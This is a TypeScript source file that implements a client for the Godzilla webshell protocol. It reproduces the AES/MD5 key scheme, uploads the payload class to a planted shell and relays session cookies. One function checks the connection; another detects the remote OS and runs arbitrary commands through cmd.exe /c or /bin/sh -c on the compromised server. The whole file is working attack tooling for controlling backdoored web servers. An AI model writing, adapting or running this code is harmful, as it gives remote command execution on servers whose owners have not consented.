/**
 * Godzilla (哥斯拉) connection test — JavaDynamicPayload protocol.
 *
 * Mirrors the Godzilla client's connect + `test()`:
 *   xc  = md5(key)[0:16]                      (AES key)
 *   md5 = md5(pass + xc), uppercase           (response wrapper)
 *   1. POST `pass=urlencode(base64(AES(payloadClass)))` — the shell stores the
 *      payload class (static field or http session, hence the cookie relay)
 *   2. POST `pass=urlencode(base64(AES(gzip(serialize({methodName:"test"})))))`
 *   3. response = md5[0:16] + base64(AES(gzip("ok"))) + md5[16:32]
 *   4. connected iff the decrypted, gunzipped body says "ok"
 */
import { GODZILLA_PAYLOAD_BYTES } from "./assets.js";
import { aesEcbDecrypt, aesEcbEncrypt, gunzipLenient, gzip, md5Hex, md5Key16 } from "./crypto.js";
import { extractCookies, postRaw, type RawPostResult } from "./http.js";
import {
  buildHeaders,
  type CommonConnectOptions,
  type ConnectTestResult,
  type ExecResult,
} from "./types.js";

/** Godzilla's `Parameter.serialize`: key bytes + 0x02 + little-endian u32 length + value. */
function serializeParams(params: Array<[string, Buffer]>): Buffer {
  const parts: Buffer[] = [];
  for (const [key, value] of params) {
    const len = Buffer.alloc(4);
    len.writeUInt32LE(value.length, 0);
    parts.push(Buffer.from(key, "utf8"), Buffer.from([0x02]), len, value);
  }
  return Buffer.concat(parts);
}

function encodeBody(pass: string, xc: string, data: Buffer): Buffer {
  const encrypted = aesEcbEncrypt(data, xc).toString("base64");
  return Buffer.from(`${pass}=${encodeURIComponent(encrypted)}`, "utf8");
}

function excerpt(body: Buffer): string {
  const text = body
    .toString("latin1")
    .replace(/[^\x20-\x7e]+/g, " ")
    .trim();
  return text.length > 200 ? `${text.slice(0, 200)}...` : text;
}

export async function testGodzilla(
  url: string,
  pass: string,
  key: string,
  options: CommonConnectOptions = {},
): Promise<ConnectTestResult> {
  const started = Date.now();
  const xc = md5Key16(key);
  const wrapper = md5Hex(pass + xc).toUpperCase();
  const left = wrapper.slice(0, 16);
  const right = wrapper.slice(16);

  const baseHeaders = buildHeaders(
    { "Content-Type": "application/x-www-form-urlencoded" },
    options,
  );
  const post = (data: Buffer, cookie?: string) =>
    postRaw(url, encodeBody(pass, xc, data), {
      headers: cookie ? { ...baseHeaders, Cookie: cookie } : baseHeaders,
      timeoutMs: options.timeoutMs,
      insecure: options.insecure,
    });

  // ---- request 1: upload the payload class ----
  let initResponse;
  try {
    initResponse = await post(GODZILLA_PAYLOAD_BYTES);
  } catch (err) {
    return {
      ok: false,
      tool: "godzilla",
      url,
      error: err instanceof Error ? err.message : String(err),
      durationMs: Date.now() - started,
    };
  }
  const cookies = extractCookies(initResponse.headers);
  const cookie = cookies.length > 0 ? cookies.join("; ") : undefined;

  // ---- request 2: invoke method "test" on the payload ----
  const callData = gzip(serializeParams([["methodName", Buffer.from("test", "utf8")]]));
  let testResponse;
  try {
    testResponse = await post(callData, cookie);
  } catch (err) {
    return {
      ok: false,
      tool: "godzilla",
      url,
      error: err instanceof Error ? err.message : String(err),
      durationMs: Date.now() - started,
    };
  }

  const text = testResponse.body.toString("latin1");
  const leftIdx = text.indexOf(left);
  const rightIdx = leftIdx === -1 ? -1 : text.indexOf(right, leftIdx + left.length);
  if (leftIdx === -1 || rightIdx === -1) {
    return {
      ok: false,
      tool: "godzilla",
      url,
      error:
        `HTTP ${testResponse.status}, response lacks the Godzilla wrapper` +
        (text.trim().length > 0 ? ` (starts with: ${excerpt(testResponse.body)})` : " (empty body)") +
        " — wrong pass/key, missing gate header, or not a Godzilla shell",
      durationMs: Date.now() - started,
    };
  }

  const wrapped = text.slice(leftIdx + left.length, rightIdx);
  try {
    const decrypted = aesEcbDecrypt(Buffer.from(wrapped, "base64"), xc);
    const result = gunzipLenient(decrypted).toString("utf8").trim();
    if (result === "ok") {
      return {
        ok: true,
        tool: "godzilla",
        url,
        detail: `payload uploaded, "test" returned ok (HTTP ${testResponse.status})`,
        durationMs: Date.now() - started,
      };
    }
    return {
      ok: false,
      tool: "godzilla",
      url,
      error: `decrypted response is ${JSON.stringify(result)}, expected "ok"`,
      durationMs: Date.now() - started,
    };
  } catch {
    return {
      ok: false,
      tool: "godzilla",
      url,
      error: "found wrapper but failed to decrypt — wrong key?",
      durationMs: Date.now() - started,
    };
  }
}

export interface GodzillaExecOptions extends CommonConnectOptions {
  /**
   * Remote OS family, used to pick the shell wrapper (`cmd.exe /c` vs
   * `/bin/sh -c`). "auto" (default) asks the payload's `getBasicsInfo`
   * first — one extra request per exec.
   */
  os?: "auto" | "windows" | "linux";
}

/**
 * Godzilla command execution — invokes the payload's `execCommand` method.
 *
 * Same transport as the connect test (payload upload + cookie relay), then:
 *   methodName=execCommand, argsCount=N, arg-0..arg-(N-1) = argv
 * The payload runs `Runtime.exec(argv)` (no shell of its own), so the
 * command line is wrapped in `cmd.exe /c` or `/bin/sh -c` here.
 */
export async function execGodzilla(
  url: string,
  pass: string,
  key: string,
  command: string,
  options: GodzillaExecOptions = {},
): Promise<ExecResult> {
  const started = Date.now();
  const xc = md5Key16(key);
  const wrapper = md5Hex(pass + xc).toUpperCase();
  const left = wrapper.slice(0, 16);
  const right = wrapper.slice(16);

  const fail = (error: string): ExecResult => ({
    ok: false,
    tool: "godzilla",
    url,
    command,
    error,
    durationMs: Date.now() - started,
  });

  const baseHeaders = buildHeaders(
    { "Content-Type": "application/x-www-form-urlencoded" },
    options,
  );
  const post = (data: Buffer, cookie?: string) =>
    postRaw(url, encodeBody(pass, xc, data), {
      headers: cookie ? { ...baseHeaders, Cookie: cookie } : baseHeaders,
      timeoutMs: options.timeoutMs,
      insecure: options.insecure,
    });

  // ---- request 1: upload the payload class ----
  let initResponse: RawPostResult;
  try {
    initResponse = await post(GODZILLA_PAYLOAD_BYTES);
  } catch (err) {
    return fail(err instanceof Error ? err.message : String(err));
  }
  const cookies = extractCookies(initResponse.headers);
  const cookie = cookies.length > 0 ? cookies.join("; ") : undefined;

  // Invoke a payload method, returning the decrypted + gunzipped result.
  const callMethod = async (
    methodName: string,
    extraParams: Array<[string, Buffer]> = [],
  ): Promise<Buffer> => {
    const callData = gzip(
      serializeParams([["methodName", Buffer.from(methodName, "utf8")], ...extraParams]),
    );
    const res = await post(callData, cookie);
    const text = res.body.toString("latin1");
    const leftIdx = text.indexOf(left);
    const rightIdx = leftIdx === -1 ? -1 : text.indexOf(right, leftIdx + left.length);
    if (leftIdx === -1 || rightIdx === -1) {
      throw new Error(
        `HTTP ${res.status}, response lacks the Godzilla wrapper` +
          (text.trim().length > 0 ? ` (starts with: ${excerpt(res.body)})` : " (empty body)") +
          " — wrong pass/key, missing gate header, or not a Godzilla shell",
      );
    }
    const wrapped = text.slice(leftIdx + left.length, rightIdx);
    return gunzipLenient(aesEcbDecrypt(Buffer.from(wrapped, "base64"), xc));
  };

  // ---- request 2 (optional): detect the remote OS ----
  let os = options.os ?? "auto";
  if (os === "auto") {
    try {
      const info = (await callMethod("getBasicsInfo")).toString("utf8");
      const osLine = info.split("\n").find((l) => l.startsWith("OsInfo :")) ?? info;
      os = /os\.name:[^\n]*windows/i.test(osLine) ? "windows" : "linux";
    } catch (err) {
      return fail(err instanceof Error ? err.message : String(err));
    }
  }

  // ---- request 3: execCommand ----
  const argv =
    os === "windows" ? ["cmd.exe", "/c", command] : ["/bin/sh", "-c", command];
  const params: Array<[string, Buffer]> = [
    ["argsCount", Buffer.from(String(argv.length), "utf8")],
    ...argv.map((arg, i): [string, Buffer] => [`arg-${i}`, Buffer.from(arg, "utf8")]),
  ];
  try {
    const output = await callMethod("execCommand", params);
    return {
      ok: true,
      tool: "godzilla",
      url,
      command,
      output: output.toString("utf8"),
      durationMs: Date.now() - started,
    };
  } catch (err) {
    if (err instanceof Error && err.message.includes("wrapper")) {
      return fail(err.message);
    }
    return fail(
      `found wrapper but failed to decrypt — wrong key? (${err instanceof Error ? err.message : String(err)})`,
    );
  }
}
